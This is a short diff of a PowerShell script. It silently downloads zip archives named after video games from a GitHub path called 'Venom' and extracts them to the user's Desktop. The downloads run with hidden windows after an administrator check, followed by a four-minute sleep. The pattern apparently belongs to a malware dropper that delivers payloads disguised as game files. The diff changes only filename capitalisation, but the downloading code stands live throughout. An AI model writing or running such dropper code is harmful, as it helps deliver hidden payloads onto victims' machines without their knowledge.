@@ -2,7 +2,7 @@ $textPath = "$env:TEMP"
 $zipFilePath = "$env:TEMP"
 $zipUrl = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip"
 $zipUrl_1 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Fifa-Ps5.zip"
-$zipUrl_2 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/gta5-Ps5.zip"
+$zipUrl_2 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Gta5-Ps5.zip"
 $desktopPath = [System.Environment]::GetFolderPath("Desktop")
 function Test-IsAdmin {
     $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
@@ -21,13 +21,13 @@ powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl -OutFile "$zipFile
 
 powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_1 -OutFile "$zipFilePath\Fifa-Ps5.zip"
 
-powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_2 -OutFile "$zipFilePath\gta5-Ps5.zip"
+powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_2 -OutFile "$zipFilePath\Gta5-Ps5.zip"
 
 Expand-Archive -Path "$zipFilePath\AssassinsCreed_SE.zip" -DestinationPath $desktopPath -Force
 
 Expand-Archive -Path "$zipFilePath\Fifa-Ps5.zip" -DestinationPath $desktopPath -Force
 
-Expand-Archive -Path "$zipFilePath\gta5-Ps5.zip" -DestinationPath $desktopPath -Force
+Expand-Archive -Path "$zipFilePath\Gta5-Ps5.zip" -DestinationPath $desktopPath -Force
 
 Start-Sleep -Seconds 240
 
